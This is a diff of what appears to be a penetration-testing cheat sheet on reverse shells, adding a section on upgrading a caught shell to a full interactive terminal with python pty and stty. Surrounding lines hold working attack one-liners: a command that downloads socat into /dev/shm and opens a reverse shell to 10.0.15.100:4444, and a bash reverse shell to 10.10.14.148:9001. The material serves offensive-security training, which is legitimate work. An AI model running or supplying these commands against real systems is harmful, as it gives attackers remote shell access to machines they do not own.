@@ -277,7 +277,25 @@ This one-liner can be injected wherever you can get command injection for an ins
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
 ```
 
-## Misc unsorted
+### Using stty options
+
+```bash
+# In reverse shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Kali
+stty raw -echo
+fg
+
+# In reverse shell
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <num> columns <cols>
+```
+
+## Misc unsorted
 
 ```bash
 bash -i >& /dev/tct/10.10.14.148/9001 0>&1
@@ -378,6 +396,6 @@ xhost +targetip
 * [http://pentestmonkey.net/blog/post-exploitation-without-a-tty](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
 * [https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)
 * [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
-
+* 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
 
